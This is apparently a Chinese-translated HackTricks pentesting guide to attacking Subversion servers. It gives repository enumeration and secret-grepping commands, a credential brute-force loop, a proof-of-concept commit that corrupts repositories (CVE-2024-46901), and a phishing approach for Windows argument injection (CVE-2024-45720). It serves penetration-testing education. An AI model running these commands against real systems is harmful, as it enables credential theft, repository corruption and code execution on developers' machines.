# 3690/tcp - Pentesting Subversion (SVN) 服务器

{{#include ../banners/hacktricks-training.md}}

## 基本信息

**Subversion (SVN)** 是一个集中式的 **版本控制系统**（Apache 许可证），用于软件的版本管理和修订控制。

**默认端口：** `3690/tcp` (svnserve)。也可以通过 `mod_dav_svn` 通过 **HTTP/HTTPS** 暴露，并且可以通过 **svn+ssh** 访问。
```text
PORT     STATE SERVICE
3690/tcp open  svnserve Subversion
```
### Banner Grabbing
```bash
nc -vn 10.10.10.10 3690
svnserve --version           # if shell access is obtained
svn --version                # client version leak via error messages
```
## 枚举
```bash
# Anonymous / authenticated listing
svn ls svn://10.10.10.203                  # list root
svn ls -R svn://10.10.10.203/repo         # recursive list
svn info svn://10.10.10.203/repo          # repo metadata
svn log svn://10.10.10.203/repo           # commit history
svn checkout svn://10.10.10.203/repo      # checkout repository
svn up -r 2                               # move working copy to revision 2
svn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes

# If served over HTTP(S)
svn ls https://10.10.10.10/svn/repo --username guest --password ''

# Extract revision props (often contain build creds, URLs, tokens)
svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo
```
### Auth & Misconfig Hunting

- `svnserve.conf` 可能允许 `anon-access = read`（或甚至 `write`）。如果你可以列出，尝试用 `checkout` 导出 secrets、scripts、CI tokens。
- 仓库经常在版本化的配置文件中存储 **build pipelines**、**deployment keys** 和 **database credentials**。checkout 后在工作副本中使用 grep：`grep -R "password\|secret\|token" -n .`。
- 如果启用了 svn+ssh，用户 shell 通常允许受限的 `svnserve` 命令；尝试使用 `ssh user@host svnserve -t` 并用精心构造的子命令绕过 wrappers。

### Bruteforcing credentials (svnserve)

`sasl` authentication（如果启用）和简单的密码文件仅由传输层保护；默认情况下没有锁定限制。可以用一个快速的 Bash 循环尝试凭证：
```bash
for u in admin dev ci; do
for p in $(cat /tmp/passlist); do
svn ls --username "$u" --password "$p" svn://10.10.10.203/repo 2>/dev/null && echo "[+] $u:$p" && break
done
done
```
## 近期漏洞（实际影响）

### mod_dav_svn DoS 通过控制字符 (CVE-2024-46901)

- 具有提交权限的用户可以写入包含控制字符（例如 `\x01`, `\x7f`）的路径，这会**损坏仓库**，导致之后的检出/日志失败，并可能导致 `mod_dav_svn` 工作进程崩溃。
- 当通过 **HTTP(S)** (`mod_dav_svn`) 提供服务时，影响 Subversion ≤ **1.14.4**。已在 **1.14.5** 中修复。
- 使用 `svnmucc` 的 PoC 提交（需要有效的提交凭证）：
```bash
# create payload file
printf 'pwn' > /tmp/payload
# commit a path with a control character in its name
svnmucc -m "DoS" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\x01path.txt'
```
- 提交之后，普通客户端可能崩溃或拒绝更新，直到管理员使用 `svnadmin dump/filter/load` 手动删除该修订。

### Windows 上 svn 客户端的参数注入 (CVE-2024-45720)

- 在 Windows 上，"best-fit" 字符编码在 `svn.exe` 中允许 **command-line argument injection**，在处理特制的非‑ASCII 路径/URL 时可能导致 arbitrary program execution。
- 影响仅限 Windows 上的 Subversion ≤ **1.14.3**；在 **1.14.4** 中修复。攻击面：通过 phishing 诱骗开发者在攻击者控制的 URL/path 上运行 `svn`。
- Pentest angle: 如果你能控制分配给 Windows 开发者的 network share 或 ZIP，给 repo URL 或 working-copy 路径起一个包含能解码为 `" & calc.exe & "` 样式注入参数的 best-fit 字节的名字，然后诱骗受害者对该路径运行 `svn status` 或类似命令。

## 利用流程注意事项

1. **检查访问方式**：`svn://` (svnserve)，`http(s)://.../svn/` (mod_dav_svn)，或 `svn+ssh://`。
2. 先尝试匿名读取；然后 spray 常见 creds。如果使用 HTTP Basic，重用在其他处发现的 creds。
3. 枚举 hooks：`hooks/pre-commit`、`post-commit` 脚本有时包含明文凭证或主机名。
4. 利用 `svn:externals` 从其他主机拉取额外路径；在 checkout 后使用 `svn propget svn:externals -R .` 列出它们。
5. Version leaks: 来自 `mod_dav_svn` 的 HTTP 响应头通常会显示 Subversion & Apache 的版本；与 1.14.5 比较以识别 vuln 目标。
6. 如果你获得对仓库的文件系统访问权限，`svnadmin dump`/`svnlook author`/`svnlook dirs-changed` 允许在无需凭证的情况下进行离线分析。


## References

- [Apache Subversion security advisory CVE-2024-46901](https://subversion.apache.org/security/CVE-2024-46901-advisory.txt)
- [Apache Subversion security advisory CVE-2024-45720](https://subversion.apache.org/security/CVE-2024-45720-advisory.txt)
{{#include ../banners/hacktricks-training.md}}
